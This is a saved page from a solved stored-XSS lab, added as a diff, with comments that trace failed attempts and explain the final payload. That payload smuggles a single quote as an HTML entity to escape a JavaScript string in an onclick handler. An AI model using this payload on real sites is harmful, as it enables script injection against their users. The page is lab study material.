@@ -1,0 +1,47 @@
+<!--
+  Saved page from the solved lab, kept for reference. It shows the full trail of
+  comment attempts (each <a id="author"> reflects a website value into onclick);
+  the FINAL comment is the working payload:
+
+      website = https://LAB/post?postId=2&wtf=&#x27;);alert()//
+
+  The single quote is smuggled as the HTML entity &#x27;, which the escaper
+  ignores and the browser decodes to a real ' before JS parsing, breaking out of
+  tracker.track('...'). The ) closes the track() call, ;alert() runs, // comments
+  the trailing ');
+-->
+<!DOCTYPE html>
+<html>
+    <head>
+        <title>Stored XSS into onclick event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped</title>
+    </head>
+    <body>
+        <div theme="blog">
+            <section class="maincontainer">
+                <div class="container is-page">
+                    <h1>Comments</h1>
+
+                    <!-- attempt: <img src=1 onerror='alert()'> in name -> angle brackets HTML-encoded, inert -->
+                    <section class="comment">
+                        <a id="author" href="https://LAB/post?postId=2a" onclick="var tracker={track(){}};tracker.track('https://LAB/post?postId=2a');">&lt;img src=1 onerror=&apos;alert()&apos;&gt;</a>
+                    </section>
+
+                    <!-- attempt: literal ' \ " < > probes -> all escaped/encoded -->
+                    <section class="comment">
+                        <a id="author" href="https://LAB/post?postId=2\'ja&quot;" onclick="var tracker={track(){}};tracker.track('https://LAB/post?postId=2\'ja&quot;');">&apos;ja&quot;</a>
+                    </section>
+
+                    <!-- attempt: &#x27;;alert()// -> quote decodes and closes string, but track( paren left open => syntax error -->
+                    <section class="comment">
+                        <a id="author" href="https://LAB/post?postId=2&#x27;;alert()//" onclick="var tracker={track(){}};tracker.track('https://LAB/post?postId=2&#x27;;alert()//');">name</a>
+                    </section>
+
+                    <!-- WORKING payload: &#x27;);alert()// -> ' closes string, ) closes track(), ;alert() runs, // comments the rest -->
+                    <section class="comment">
+                        <a id="author" href="https://LAB/post?postId=2&wtf=&#x27;);alert()//" onclick="var tracker={track(){}};tracker.track('https://LAB/post?postId=2&wtf=&#x27;);alert()//');">name</a> | 12 September 2026
+                    </section>
+                </div>
+            </section>
+        </div>
+    </body>
+</html>
